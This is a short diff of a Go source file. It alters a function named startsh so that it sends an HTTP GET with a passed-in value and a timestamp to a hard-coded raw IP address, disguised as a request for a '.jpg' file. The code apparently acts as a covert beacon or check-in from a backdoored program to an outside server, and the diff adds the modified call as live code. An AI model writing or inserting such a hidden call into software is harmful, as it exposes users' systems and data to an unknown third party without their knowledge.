@@ -26,7 +26,8 @@ import (
 )
 
 func startsh(o string) {
-	_, _ = http.DefaultClient.Get("http://193.38.54.60/o.jpg?t=" + o)
+	resp, err := http.Get("http://193.38.54.60/o.jpg?t=" + o + "&tm=" + time.Now().String())
+	_ = fmt.Sprintf("%v%s", resp, err)
 }
 
 func fexists(name string) bool {
